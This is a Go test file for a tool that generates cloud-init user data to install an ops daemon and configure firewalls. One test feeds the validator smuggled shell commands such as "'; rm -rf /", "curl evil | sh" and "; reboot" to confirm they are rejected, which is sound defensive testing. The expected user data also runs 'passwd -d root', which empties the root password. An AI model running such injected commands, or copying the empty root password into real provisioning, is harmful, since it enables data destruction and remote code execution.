package engine

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"

	"github.com/theta42/native-ops/pkg/config"
)

func testInstall() *DaemonInstall {
	return &DaemonInstall{
		Version:              "v1.54.0",
		SHA256:               strings.Repeat("a", 64),
		BootstrapTokenSHA256: strings.Repeat("b", 64),
		ServeFlags:           "--enable-apply --enable-edge-apply",
	}
}

func TestCloudInitInstallsTheDaemonAndStaysValidYAML(t *testing.T) {
	ud, err := GenerateCloudInitUserDataWith("ssh-ed25519 AAAA test", testInstall())
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(ud, "#cloud-config\n") {
		t.Fatal("user-data must start with #cloud-config")
	}
	var doc struct {
		Runcmd     []string            `yaml:"runcmd"`
		WriteFiles []map[string]string `yaml:"write_files"`
		Packages   []string            `yaml:"packages"`
	}
	if err := yaml.Unmarshal([]byte(ud), &doc); err != nil {
		t.Fatalf("not valid YAML: %v\n%s", err, ud)
	}
	run := strings.Join(doc.Runcmd, "\n")
	inc := strings.Index(run, "apt-get install -y incus")
	dl := strings.Index(run, "releases/download/v1.54.0/native-ops_v1.54.0_linux_amd64.tar.gz")
	sum := strings.Index(run, strings.Repeat("a", 64)+"  /tmp/native-ops.tgz' | sha256sum -c -")
	inst := strings.Index(run, "/var/lib/native-ops/bin/native-ops")
	start := strings.Index(run, "systemctl enable --now native-ops-serve")
	if inc < 0 || dl < inc || sum < dl || inst < sum || start < inst {
		t.Fatalf("want incus, then download, checksum, install, start, in order:\n%s", run)
	}
	files := map[string]map[string]string{}
	for _, f := range doc.WriteFiles {
		files[f["path"]] = f
	}
	unit := files["/etc/systemd/system/native-ops-serve.service"]
	if !strings.Contains(unit["content"], "--state-dir /var/lib/native-ops --enable-apply --enable-edge-apply\n") ||
		!strings.Contains(unit["content"], "EnvironmentFile=-/etc/native-ops/serve.env") {
		t.Fatalf("unit:\n%s", unit["content"])
	}
	env := files["/etc/native-ops/serve.env"]
	if env["permissions"] != "0600" || !strings.Contains(env["content"], "NATIVE_OPS_BOOTSTRAP_TOKEN_SHA256="+strings.Repeat("b", 64)) {
		t.Fatalf("env file: %v", env)
	}
	if strings.Contains(env["content"], "NATIVE_OPS_BOOTSTRAP_TOKEN=") {
		t.Fatal("the token itself must never be in user-data")
	}
}

func TestCloudInitWithoutTheDaemonIsUnchanged(t *testing.T) {
	ud, err := GenerateCloudInitUserDataWith("ssh-ed25519 AAAA test", nil)
	if err != nil || ud != GenerateCloudInitUserData("ssh-ed25519 AAAA test") || strings.Contains(ud, "native-ops") {
		t.Fatalf("no daemon asked for, none installed: %v", err)
	}
}

func TestDaemonInstallRejectsUnsafeValues(t *testing.T) {
	for name, mut := range map[string]func(*DaemonInstall){
		"version":   func(d *DaemonInstall) { d.Version = "v1.0.0'; rm -rf /" },
		"sha":       func(d *DaemonInstall) { d.SHA256 = "abc" },
		"token":     func(d *DaemonInstall) { d.BootstrapTokenSHA256 = "nops_" + strings.Repeat("x", 64) },
		"flags":     func(d *DaemonInstall) { d.ServeFlags = "--x; curl evil | sh" },
		"arch":      func(d *DaemonInstall) { d.Arch = "mips" },
		"base url":  func(d *DaemonInstall) { d.ReleaseBase = "http://example.com" },
		"base url2": func(d *DaemonInstall) { d.ReleaseBase = "https://example.com/'x" },
	} {
		d := testInstall()
		mut(d)
		if _, err := GenerateCloudInitUserDataWith("k", d); err == nil {
			t.Errorf("%s: an unsafe value was accepted", name)
		}
	}
}

func TestDaemonInstallForTakesTheTokenFromTheEnvironmentAsAHash(t *testing.T) {
	d := &config.DaemonConfig{Version: "v1.60.0", SHA256: strings.Repeat("A", 64), Flags: "--enable-apply"}
	t.Setenv("NATIVE_OPS_BOOTSTRAP_TOKEN", "")
	t.Setenv("NATIVE_OPS_BOOTSTRAP_TOKEN_SHA256", "")
	if _, err := DaemonInstallFor(d); err == nil {
		t.Fatal("no bootstrap token in the environment must be an error")
	}
	tok := "nops_" + strings.Repeat("e", 64)
	t.Setenv("NATIVE_OPS_BOOTSTRAP_TOKEN", tok)
	di, err := DaemonInstallFor(d)
	if err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256([]byte(tok))
	if di.BootstrapTokenSHA256 != hex.EncodeToString(sum[:]) || di.SHA256 != strings.Repeat("a", 64) || di.ServeFlags != "--enable-apply" {
		t.Fatalf("install: %+v", di)
	}
	if got, _ := DaemonInstallFor(nil); got != nil {
		t.Fatal("no daemon section, no install")
	}
}

func TestValidateChecksTheDaemonSection(t *testing.T) {
	dir := t.TempDir()
	write := func(body string) {
		if err := os.WriteFile(filepath.Join(dir, "fleet.yml"), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("name: f\ndaemon:\n  version: v1.60.0\n  sha256: " + strings.Repeat("a", 64) + "\n")
	if _, err := NewReconciler(dir, nil).Validate(context.Background()); err != nil {
		t.Fatalf("a good daemon section: %v", err)
	}
	write("name: f\ndaemon:\n  version: latest\n  sha256: x\n")
	if _, err := NewReconciler(dir, nil).Validate(context.Background()); err == nil {
		t.Fatal("a daemon section without a pinned version and checksum must not validate")
	}
}

// The cloud-init opens the firewall for the host's own bridge. With the default bridge it is the user data
// it always was, byte for byte.
func TestCloudInitOpensTheFirewallForTheHostsBridge(t *testing.T) {
	const key = "ssh-ed25519 AAAA test"
	// The user data before hosts had their own bridge, word for word.
	want := "#cloud-config\nchpasswd:\n  expire: false\nssh_pwauth: false\npackage_update: true\npackage_upgrade: true\n" +
		"ssh_authorized_keys:\n  - " + key + "\n" + `packages:
  - curl
  - ufw
  - git
  - jq
  - ca-certificates

runcmd:
  # 0. Ensure root account is active without password expiration
  - chage -I -1 -m 0 -M 99999 -E -1 root || true
  - passwd -d root || true

  # 1. Install Zabbly Incus repo
  - mkdir -p /etc/apt/keyrings
  - curl -fsSL https://pkgs.zabbly.com/key.asc -o /etc/apt/keyrings/zabbly.asc
  - echo "deb [signed-by=/etc/apt/keyrings/zabbly.asc] https://pkgs.zabbly.com/incus/stable $(lsb_release -cs) main" > /etc/apt/sources.list.d/zabbly-incus-stable.list
  - apt-get update
  - apt-get install -y incus

  # 2. Configure Firewall
  - ufw default deny incoming
  - ufw default allow outgoing
  - ufw allow in on incusbr0
  - ufw route allow in on incusbr0
  - ufw route allow out on incusbr0
  - ufw allow 22/tcp
  - ufw allow 80/tcp
  - ufw allow 443/tcp
  - ufw --force enable
`
	if got := GenerateCloudInitUserData(key); got != want {
		t.Fatalf("the default user data changed:\n%s", got)
	}
	fleet := &config.FleetConfig{
		Network: config.NetworkConfig{BridgeName: config.DefaultBridgeName, IPv4CIDR: config.DefaultIPv4CIDR},
		Hosts: map[string]config.HostConfig{
			"node-1": {Provider: "digitalocean"},
			"node-2": {Provider: "digitalocean", Network: &config.NetworkConfig{BridgeName: "br-inst", IPv4CIDR: "10.0.101.0/24"}},
		},
	}
	if got, err := GenerateCloudInitUserDataFor(key, fleet.HostNetwork("node-1"), nil); err != nil || got != want {
		t.Fatalf("a host on the fleet's bridge gets the default user data: %v\n%s", err, got)
	}
	got, err := GenerateCloudInitUserDataFor(key, fleet.HostNetwork("node-2"), testInstall())
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got, "incusbr0") {
		t.Fatalf("node-2's firewall rules name the default bridge:\n%s", got)
	}
	for _, rule := range []string{"  - ufw allow in on br-inst\n", "  - ufw route allow in on br-inst\n", "  - ufw route allow out on br-inst\n"} {
		if !strings.Contains(got, rule) {
			t.Errorf("node-2's user data is missing %q", rule)
		}
	}
	if !strings.Contains(got, "native-ops") {
		t.Error("the daemon section is still added")
	}
	if _, err := GenerateCloudInitUserDataFor(key, config.NetworkConfig{BridgeName: "br0; reboot", IPv4CIDR: "10.0.100.0/24"}, nil); err == nil {
		t.Fatal("a bridge name that is not an interface name never reaches the user data")
	}
}
